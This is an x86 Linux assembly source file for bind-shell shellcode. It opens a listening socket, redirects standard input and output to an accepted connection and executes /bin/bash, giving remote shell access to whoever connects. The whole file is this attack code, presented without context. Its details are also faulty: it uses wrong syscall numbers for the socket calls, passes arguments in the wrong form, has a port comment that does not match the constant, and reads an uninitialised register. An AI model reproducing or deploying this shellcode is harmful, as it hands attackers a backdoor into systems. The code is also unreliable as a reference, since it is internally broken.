.section .bss
    sin:
        .long 0
        .long 0
        .long 0
    sock:
        .long 0
    fd:
        .long 0

.section .data
    bash:
        .string "/bin/bash"

.section .text
.global _start
_start:
    /* Create socket */
    mov $1, %eax             /* sys_socketcall */
    mov $1, %ebx             /* socket */
    mov $2, %ecx             /* AF_INET */
    mov $1, %edx             /* SOCK_STREAM */
    int $0x80                /* syscall */

    /* Store socket descriptor */
    mov %eax, sock

    /* Prepare sockaddr_in structure */
    mov $0x2, %ax            /* AF_INET */
    mov %ax, (%esi)          /* sin_family */
    mov $0x7527, %ax         /* port 10101 */
    push %ax
    mov %sp, %ebx
    mov %ebx, 2(%esi)        /* sin_port */

    /* Bind */
    mov $2, %eax             /* sys_socketcall */
    mov $2, %ebx             /* bind */
    lea sin, %ecx            /* pointer to sockaddr_in */
    mov $16, %edx            /* sizeof(struct sockaddr_in) */
    int $0x80                /* syscall */

    /* Listen */
    mov $2, %eax             /* sys_socketcall */
    mov $4, %ebx             /* listen */
    mov sock, %ecx           /* sockfd */
    mov $1, %edx             /* backlog */
    int $0x80                /* syscall */

    /* Accept */
    mov $2, %eax             /* sys_socketcall */
    mov $5, %ebx             /* accept */
    mov sock, %ecx           /* sockfd */
    push $0                  /* addr */
    push $0
    push $0
    lea (%esp), %ecx         /* struct sockaddr_in *addr */
    push $16                 /* addrlen */
    push %ecx
    mov %esp, %ecx
    int $0x80                /* syscall */

    /* Store accepted socket descriptor */
    mov %eax, fd

    /* Redirect stdin, stdout, stderr to the accepted socket */
    mov $63, %eax            /* sys_dup2 */
    mov fd, %ebx             /* oldfd */
    mov $0, %ecx             /* newfd = stdin */
    int $0x80                /* syscall */

    mov $63, %eax            /* sys_dup2 */
    mov fd, %ebx             /* oldfd */
    mov $1, %ecx             /* newfd = stdout */
    int $0x80                /* syscall */

    mov $63, %eax            /* sys_dup2 */
    mov fd, %ebx             /* oldfd */
    mov $2, %ecx             /* newfd = stderr */
    int $0x80                /* syscall */

    /* Execute /bin/bash */
    mov $11, %eax            /* sys_execve */
    lea bash, %ebx           /* filename */
    xor %ecx, %ecx           /* argv = NULL */
    xor %edx, %edx           /* envp = NULL */
    int $0x80                /* syscall */

